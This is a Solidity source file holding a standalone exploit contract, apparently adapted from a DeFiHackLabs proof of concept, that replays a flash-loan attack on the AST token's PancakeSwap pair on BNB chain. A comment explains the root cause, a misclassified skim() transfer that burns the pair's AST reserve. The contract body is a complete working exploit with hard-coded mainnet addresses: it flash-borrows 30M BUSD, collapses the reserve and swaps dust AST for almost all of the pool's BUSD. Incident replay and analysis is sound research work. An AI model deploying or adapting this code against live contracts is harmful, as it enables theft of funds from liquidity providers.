// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-01-Ast).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the PancakeV3 flash-loan callback `pancakeV3FlashCallback` lives on the
// test itself, and `address(this)` acts as both attacker and "exploit
// contract" throughout), so there is no standalone contract to deploy. This
// contract is a faithful, self-contained copy of that inline attack
// (testExploit -> run(), pancakeV3FlashCallback unchanged) so the playground
// can deploy it and record run(). Logic and constants are copied verbatim
// from test/Ast_exp.sol.
//
// Root cause: AST's _transfer() tries to infer PancakeSwap liquidity add/
// remove events by watching the pair's BUSD balance and the caller's LP
// balance (checkLiquidityAdd / checkLiquidityRm). checkLiquidityAdd credits
// `lastBalance[from]` on ANY BUSD inflow to the pair, without requiring an
// actual LP mint. checkLiquidityRm then compares the recipient's (zero) LP
// balance against that phantom credit and concludes "liquidity removed",
// causing _transfer to _burn() the transferred AST straight out of the pair
// instead of delivering it. The attacker exploits this by depositing AST
// into the pair directly then calling the pair's permissionless skim() -
// skim's outbound AST transfer is misclassified as a liquidity removal and
// burned from the pair's own reserves, degenerating the pool to ~1 wei of
// AST reserve while BUSD reserve stays at ~30.08M. A trivial swap of the
// attacker's leftover dust AST then drains nearly the entire BUSD reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakePair {
    function skim(address to) external;
    function sync() external;
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract AstDrain {
    // AST token (vulnerable contract).
    address constant ast = 0xc10E0319337c7F83342424Df72e73a70A29579B2;
    // BUSD.
    address constant busd = 0x55d398326f99059fF775485246999027B3197955;
    // BUSD/AST PancakeSwap-V2 pair.
    IPancakePair constant BUSD_AST_LPPool = IPancakePair(0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a);
    // PancakeSwap-V3 pool used purely as the flash-loan source.
    IPancakeV3Pool constant PancakePool = IPancakeV3Pool(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    // PancakeSwap V2 router.
    IPancakeRouter constant pancakeRouter = IPancakeRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    // Arbitrary non-whitelisted throwaway recipient for the first swap (not
    // part of the vulnerability - just needs to not be `address(this)` so the
    // AST lands somewhere before being pulled back for the deposit).
    address constant proxy = 0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4;

    uint256 constant busd_amount = 30_000_000 * 1e18;

    // Step 0: flash-borrow 30,000,000 BUSD from the PancakeV3 pool. The pool
    // calls back pancakeV3FlashCallback(...) once the BUSD is already here.
    function run() external {
        bytes memory data = abi.encode(busd_amount);
        PancakePool.flash(address(this), busd_amount, 0, data);
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, bytes memory data) external {
        // Step 1: approve the router for the swaps/deposits below.
        IERC20(busd).approve(address(pancakeRouter), type(uint256).max);
        IERC20(ast).approve(address(pancakeRouter), type(uint256).max);
        IERC20(address(BUSD_AST_LPPool)).approve(address(pancakeRouter), type(uint256).max);

        // Step 2: swap the entire 30,000,000 BUSD flash loan for AST, sizing
        // the pool's price crash. The output is sent to `proxy` (an arbitrary
        // non-whitelisted address), not back to this contract.
        address[] memory path1 = new address[](2);
        path1[0] = busd;
        path1[1] = ast;
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busd_amount, 0, path1, proxy, block.timestamp
        );

        // Step 3: compute the pair's current AST balance minus 1 wei - this
        // is the amount that will be deposited (not the full balance) so a
        // later skim() has exactly 1 wei of surplus to misclassify.
        uint256 lpAstAmount = IERC20(ast).balanceOf(address(BUSD_AST_LPPool)) - 1;

        // Step 4: deposit BUSD + AST directly into the pair (NOT via
        // addLiquidity - the asset ratio would reject it). This is a plain
        // token transfer, not a real liquidity mint; no LP tokens are issued.
        IERC20(busd).transfer(address(BUSD_AST_LPPool), 1 * 1e18);
        IERC20(ast).transfer(address(BUSD_AST_LPPool), lpAstAmount);

        // Step 5: THE BUG. skim() sweeps the pair's balances above its cached
        // reserves back to the caller. The outbound AST leg of that sweep
        // re-enters AST._transfer with from == pair, and AST misclassifies it
        // as a liquidity removal (checkLiquidityRm sees this contract's LP
        // balance of 0 against the phantom lastBalance credit checkLiquidityAdd
        // created during the swap above) - so AST _burns_ the skimmed amount
        // out of the pair instead of paying it to this contract. The pair's
        // AST reserve collapses to ~1 wei while its BUSD reserve stays huge.
        BUSD_AST_LPPool.skim(address(this));
        BUSD_AST_LPPool.sync();

        // Step 6: swap this contract's remaining dust AST back into BUSD.
        // Because the pool's reserves are now (huge BUSD, ~1 wei AST), the
        // constant-product formula pays out almost the entire BUSD reserve
        // for a fraction-of-an-AST input.
        address[] memory path2 = new address[](2);
        path2[0] = ast;
        path2[1] = busd;
        uint256 astAmount = IERC20(ast).balanceOf(address(this));
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            astAmount, 0, path2, address(this), block.timestamp
        );

        // Step 7: repay the flash loan + fee. Everything left over is profit.
        (uint256 amount) = abi.decode(data, (uint256));
        IERC20(busd).transfer(msg.sender, amount + fee0);
    }
}
